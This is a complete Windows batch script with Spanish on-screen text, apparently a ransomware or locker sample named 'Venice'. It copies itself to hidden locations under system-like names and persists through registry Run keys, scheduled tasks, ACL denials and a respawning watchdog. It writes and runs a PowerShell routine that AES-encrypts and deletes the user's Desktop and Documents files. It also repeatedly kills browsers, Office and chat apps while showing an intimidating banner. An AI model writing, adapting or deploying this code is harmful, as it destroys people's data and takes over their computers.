@echo off
setlocal EnableExtensions EnableDelayedExpansion

if /i "%~1"=="watchdog"  goto :watchdog
if /i "%~1"=="decrypt"   goto :decrypt
if /i "%~1"=="uninstall" goto :uninstall

title Warning-Venice-System
color 0C

set "ME=%~f0"
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
set "EXE=%DIR%\WinSys.bat"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "TITLE=Warning-Venice-System"
set "WTITLE=VeniceWatchdog"

if not exist "%DIR%" md "%DIR%" >nul 2>&1
attrib +h "%DIR%" >nul 2>&1

call :install

rem ---- si ya hay una ventana principal, no duplicar ----
set "RUN=1"
for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%TITLE%'}).Count"') do set "RUN=%%A"
if "%RUN%"=="" set "RUN=1"
if %RUN% GEQ 2 (
    call :ensure_watchdog
    exit /b
)

if not exist "%DIR%\.locked" (
    cls
    color 0F
    echo.
    echo   [*] Instalando persistencia...
    echo   [*] Cifrando Escritorio y Documentos (AES-256)...
    call :encrypt
    >"%DIR%\.locked" echo ok
    attrib +h +s "%DIR%\.locked" >nul 2>&1
)

mode con cols=150 lines=50 >nul 2>&1
powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Milliseconds 450; (New-Object -ComObject WScript.Shell).SendKeys('{F11}')" >nul 2>&1

call :ensure_watchdog

cls
color 0C
call :banner

:main
call :kill_apps
call :ensure_watchdog
echo   [%TIME%]  Sistema activo. Ventana verificada. Aplicaciones cerradas.
ping -n 6 127.0.0.1 >nul
goto :main

:banner
echo.
echo.
echo              #   #  ###  ####  #   #  #####  #   #   ####
echo              #   # #   # #   # ##  #   #    ##  #  #
echo              # # # ##### ####  # # #   #    # # #  # ###
echo              ## ## #   # #  #  #  ##   #    #  ##  #   #
echo              #   # #   # #   # #   # #####  #   #   ####
echo.
echo   ==================================================================
echo.
echo      ^¿Por que queres este tipo de contenido^?
echo.
echo      Su computadora no dejara de hacer esto.
echo.
echo   ==================================================================
echo.
echo   Archivos del Escritorio y Documentos cifrados en AES-256.
echo   Tareas, claves de registro y 5 copias activas. Watchdog cada 5 s.
echo.
exit /b

:kill_apps
for %%P in (notepad.exe mspaint.exe chrome.exe msedge.exe firefox.exe opera.exe brave.exe WINWORD.EXE EXCEL.EXE POWERPNT.EXE outlook.exe Teams.exe ms-teams.exe Discord.exe Telegram.exe Spotify.exe Code.exe steam.exe vlc.exe wmplayer.exe Skype.exe Zoom.exe) do taskkill /f /im %%P >nul 2>&1
exit /b

:install
copy /y "%ME%" "%EXE%" >nul 2>&1
copy /y "%ME%" "%STARTUP%\WindowsSystem.bat" >nul 2>&1
copy /y "%ME%" "%TEMP%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%ProgramData%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%PUBLIC%\WinSys.bat" >nul 2>&1
copy /y "%ME%" "%USERPROFILE%\WinSys.bat" >nul 2>&1

attrib +r +h +s "%EXE%" >nul 2>&1
attrib +r +h +s "%STARTUP%\WindowsSystem.bat" >nul 2>&1
attrib +r +h +s "%PUBLIC%\WinSys.bat" >nul 2>&1
attrib +r +h +s "%ProgramData%\WinSys.bat" >nul 2>&1

icacls "%EXE%" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%STARTUP%\WindowsSystem.bat" /deny "%USERNAME%:(D)" >nul 2>&1
icacls "%PUBLIC%\WinSys.bat" /deny "%USERNAME%:(D)" >nul 2>&1

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1

schtasks /create /tn "WindowsSystemUpdate" /tr "\"%EXE%\"" /sc onlogon /f >nul 2>&1
schtasks /create /tn "WindowsSystemUpdate2" /tr "\"%EXE%\"" /sc minute /mo 1 /f >nul 2>&1
exit /b

:ensure_watchdog
set "W=0"
for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%WTITLE%'}).Count"') do set "W=%%A"
if "%W%"=="" set "W=0"
if "%W%"=="0" start "" /min cmd /c ""%EXE%" watchdog"
exit /b

:watchdog
title VeniceWatchdog
color 0C
set "EXE=%~f0"
set "TITLE=Warning-Venice-System"
:wd
set "N=0"
for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%TITLE%'}).Count"') do set "N=%%A"
if "%N%"=="" set "N=0"
if "%N%"=="0" (
    start "" cmd /c ""%EXE%" boot"
    ping -n 4 127.0.0.1 >nul
)
ping -n 6 127.0.0.1 >nul
goto :wd

:encrypt
> "%DIR%\enc.ps1" echo $ErrorActionPreference='SilentlyContinue'
>>"%DIR%\enc.ps1" echo $rng=New-Object Security.Cryptography.RNGCryptoServiceProvider
>>"%DIR%\enc.ps1" echo $key=New-Object byte[] 32
>>"%DIR%\enc.ps1" echo $rng.GetBytes($key)
>>"%DIR%\enc.ps1" echo $iv=New-Object byte[] 16
>>"%DIR%\enc.ps1" echo $rng.GetBytes($iv)
>>"%DIR%\enc.ps1" echo $hx=[BitConverter]::ToString($key)+'^|'+[BitConverter]::ToString($iv)
>>"%DIR%\enc.ps1" echo [IO.File]::WriteAllText("$env:APPDATA\Microsoft\Windows\SystemCache\.vk",$hx)
>>"%DIR%\enc.ps1" echo $aes=[Security.Cryptography.Aes]::Create()
>>"%DIR%\enc.ps1" echo $aes.Key=$key
>>"%DIR%\enc.ps1" echo $aes.IV=$iv
>>"%DIR%\enc.ps1" echo foreach($d in @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents")){
>>"%DIR%\enc.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse ^| ? {$_.Extension -ne '.venice'} ^| ForEach-Object{
>>"%DIR%\enc.ps1" echo   $b=[IO.File]::ReadAllBytes($_.FullName)
>>"%DIR%\enc.ps1" echo   $e=$aes.CreateEncryptor()
>>"%DIR%\enc.ps1" echo   $o=$e.TransformFinalBlock($b,0,$b.Length)
>>"%DIR%\enc.ps1" echo   $e.Dispose()
>>"%DIR%\enc.ps1" echo   [IO.File]::WriteAllBytes($_.FullName+'.venice',$o)
>>"%DIR%\enc.ps1" echo   Remove-Item -LiteralPath $_.FullName -Force
>>"%DIR%\enc.ps1" echo  }
>>"%DIR%\enc.ps1" echo }
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\enc.ps1"
exit /b

:decrypt
title Restaurando archivos
color 0A
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
if not exist "%DIR%\.vk" (
    echo.
    echo   No se encontro la clave de cifrado.
    pause
    exit /b
)
> "%DIR%\dec.ps1" echo $ErrorActionPreference='SilentlyContinue'
>>"%DIR%\dec.ps1" echo $p=[IO.File]::ReadAllText("$env:APPDATA\Microsoft\Windows\SystemCache\.vk").Split('^|')
>>"%DIR%\dec.ps1" echo $aes=[Security.Cryptography.Aes]::Create()
>>"%DIR%\dec.ps1" echo $aes.Key=[byte[]]($p[0].Split('-')^|%%{[Convert]::ToByte($_,16)})
>>"%DIR%\dec.ps1" echo $aes.IV=[byte[]]($p[1].Split('-')^|%%{[Convert]::ToByte($_,16)})
>>"%DIR%\dec.ps1" echo foreach($d in @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents")){
>>"%DIR%\dec.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse -Filter *.venice ^| ForEach-Object{
>>"%DIR%\dec.ps1" echo   $b=[IO.File]::ReadAllBytes($_.FullName)
>>"%DIR%\dec.ps1" echo   $de=$aes.CreateDecryptor()
>>"%DIR%\dec.ps1" echo   $o=$de.TransformFinalBlock($b,0,$b.Length)
>>"%DIR%\dec.ps1" echo   $de.Dispose()
>>"%DIR%\dec.ps1" echo   [IO.File]::WriteAllBytes($_.FullName.Substring(0,$_.FullName.Length-7),$o)
>>"%DIR%\dec.ps1" echo   Remove-Item -LiteralPath $_.FullName -Force
>>"%DIR%\dec.ps1" echo  }
>>"%DIR%\dec.ps1" echo }
echo.
echo   Descifrando...
powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%\dec.ps1"
del /q "%DIR%\.locked" >nul 2>&1
attrib -h -s "%DIR%\.locked" >nul 2>&1
echo.
echo   Listo. Archivos restaurados.
pause
exit /b

:uninstall
title Desinstalando
color 0A
set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /f >nul 2>&1
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /f >nul 2>&1

schtasks /delete /tn "WindowsSystemUpdate" /f >nul 2>&1
schtasks /delete /tn "WindowsSystemUpdate2" /f >nul 2>&1

taskkill /f /fi "WINDOWTITLE eq VeniceWatchdog" >nul 2>&1

for %%F in ("%EXE%" "%STARTUP%\WindowsSystem.bat" "%PUBLIC%\WinSys.bat" "%ProgramData%\WinSys.bat" "%USERPROFILE%\WinSys.bat" "%TEMP%\WinSys.bat") do (
    icacls %%~F /remove:d "%USERNAME%" >nul 2>&1
    attrib -h -s -r %%~F >nul 2>&1
    del /f /q %%~F >nul 2>&1
)
echo.
echo   Persistencia eliminada.
echo   Los archivos cifrados siguen como .venice: usa "decrypt" antes.
pause
exit /b
